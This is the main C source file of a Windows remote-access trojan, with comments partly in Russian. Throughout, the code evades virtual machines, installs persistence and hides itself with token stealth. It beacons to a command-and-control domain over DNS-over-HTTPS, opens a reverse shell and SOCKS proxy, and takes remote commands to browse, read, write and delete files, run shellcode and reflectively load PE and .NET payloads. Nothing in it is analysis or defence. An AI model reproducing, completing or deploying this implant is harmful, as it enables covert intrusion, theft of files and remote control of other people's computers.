#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>    
#include "anti.h"        // AntiVM / Persistence /  FileMgr_ all
#include "user.h"        // Stealth / ExecuteShellcode /  ReflectiveLoadPE / .NET
#include "proxy.h"       // Proxy_Start / Proxy_Stop
#include "net.h"         // C2Loop
#include "config.h"      
#include "parson.h"      // parser json

#pragma comment(lib, "crypt32.lib")

static HANDLE shellThread = NULL;

// Decode Base64
static bool Base64Decode(const char *b64, uint8_t **outBuf, size_t *outLen) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(b64, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return false;
    uint8_t *buf = (uint8_t*)malloc(len);
    if (!buf) return false;
    if (!CryptStringToBinaryA(b64, 0, CRYPT_STRING_BASE64, buf, &len, NULL, NULL)) {
        free(buf);
        return false;
    }
    *outBuf = buf;
    *outLen = (size_t)len;
    return true;
}

// Callback
static bool list_dir_cb(const char *full_path, bool is_directory, void *ctx) {
    printf("%s %s\n", is_directory ? "[DIR] " : "[FILE]", full_path);
    return true;
}

/**
 * Обработчик C2-команд. Тянет фоновым потоком:
 * buffer[0..buf_len-1]
 */
void dispatch_command(const uint8_t *buffer, size_t buf_len) {
    char *json = malloc(buf_len + 1);
    if (!json) return;
    memcpy(json, buffer, buf_len);
    json[buf_len] = '\0';

    JSON_Value  *root = json_parse_string(json);
    JSON_Object *o    = root ? json_value_get_object(root) : NULL;
    const char  *cmd  = o ? json_object_get_string(o, "cmd") : NULL;

    if (cmd) {
        if (strcmp(cmd, "start_proxy") == 0) {
            // reverse-shell + SOCKS5
            shellThread = Proxy_Start();
            if (!shellThread) fprintf(stderr, "ERROR: Proxy_Start failed\n");
        }
        else if (strcmp(cmd, "stop_proxy") == 0) {
            // Stop
            if (shellThread) {
                Proxy_Stop(shellThread);
                shellThread = NULL;
            }
        }
        else if (strcmp(cmd, "list_dir") == 0) {
            // Go dir
            const char *path = json_object_get_string(o, "path");
            if (path) FileMgr_ListDirectory(path, list_dir_cb, NULL);
        }
        else if (strcmp(cmd, "file_get") == 0) {
            // Read file
            const char *path = json_object_get_string(o, "path");
            if (path) {
                uint8_t *buf; size_t sz;
                if (FileMgr_ReadFile(path, &buf, &sz)) {
                    // buf→base64 прокинуть ответку на C2
                    free(buf);
                }
            }
        }
        else if (strcmp(cmd, "file_put") == 0) {
            // Write file
            const char *path = json_object_get_string(o, "path");
            const char *data = json_object_get_string(o, "data");
            if (path && data) {
                uint8_t *buf; size_t sz;
                if (Base64Decode(data, &buf, &sz)) {
                    FileMgr_WriteFile(path, buf, sz);
                    free(buf);
                }
            }
        }
        else if (strcmp(cmd, "file_del") == 0) {
            // Del 
            const char *path = json_object_get_string(o, "path");
            if (path) FileMgr_Delete(path);
        }
        else if (strcmp(cmd, "run_shellcode") == 0) {
            // shellcode
            const char *data = json_object_get_string(o, "data");
            if (data) {
                uint8_t *sc; size_t len;
                if (Base64Decode(data, &sc, &len)) {
                    User_ExecuteShellcode(sc, len);
                    free(sc);
                }
            }
        }
        else if (strcmp(cmd, "load_pe") == 0) {
            // PE
            const char *data = json_object_get_string(o, "data");
            if (data) {
                uint8_t *pe; size_t len;
                if (Base64Decode(data, &pe, &len)) {
                    User_ReflectiveLoadPE(pe, len);
                    free(pe);
                }
            }
        }
        else if (strcmp(cmd, "load_dotnet") == 0) {
            // .NET
            const char *data = json_object_get_string(o, "data");
            if (data) {
                uint8_t *asm_bytes; size_t len;
                if (Base64Decode(data, &asm_bytes, &len)) {
                    User_ReflectiveLoadDotNet(asm_bytes, len);
                    free(asm_bytes);
                }
            }
        }
         // reflective shellcode
        else if (strcmp(cmd, "exec_reflective") == 0) {
            const char *data = json_object_get_string(o, "data");
            if (data) {
                uint8_t *payload; size_t len;
                if (Base64Decode(data, &payload, &len)) {
                    User_ExecuteReflectiveShellcode(payload, len);
                    free(payload);
                }
            }
        }
    }

    // Clean
    if (root) json_value_free(root);
    free(json);
}

int main(void) {
    // Anti-VM
    if (AntiVM_IsVirtualMachine()) {
        fprintf(stderr, "ERROR: Virtual machine detected. Exiting.\n");
        return 1;
    }

    //  Persistence
    if (!Persistence_Install()) {
        fprintf(stderr, "WARNING: Persistence installation failed\n");
    }

    // 3) Token-stealth
    if (!User_StealthStart()) {
        fprintf(stderr, "WARNING: token-stealth init failed\n");
    }

    // DoH
    if (!Net_Init()) {
        fprintf(stderr, "ERROR: Net_Init() failed\n");
        User_StealthStop();
        return 1;
    }

    // Signal C2 (ответку игнорим)
    {
        uint8_t buf[512]; size_t len = sizeof(buf);
        if (!Net_DoHQuery(C2_SIGNAL_DOMAIN, 1 /*A*/, buf, &len)) {
            fprintf(stderr, "WARNING: C2 signal failed\n");
        }
    }

    // Фон C2 поток 5000 мс
    if (!Net_StartC2Loop(C2_SIGNAL_DOMAIN, 16 /*TXT*/, 5000, dispatch_command)) {
        fprintf(stderr, "ERROR: Net_StartC2Loop() failed\n");
        Net_Shutdown();
        User_StealthStop();
        return 1;
    }

    // reverse shell + reverse SOCKS автоматически
    shellThread = Proxy_Start();
    if (!shellThread) {
        fprintf(stderr, "ERROR: Proxy_Start() failed\n");
        Net_StopC2Loop();
        Net_Shutdown();
        User_StealthStop();
        return 1;
    }

    printf("Proxy module is running. Press Enter to stop...\n");
    getchar();

    // Stop
    Proxy_Stop(shellThread);
    Net_StopC2Loop();
    Net_Shutdown();
    User_StealthStop();

    printf("Stopped. Goodbye!\n");
    return 0;
}
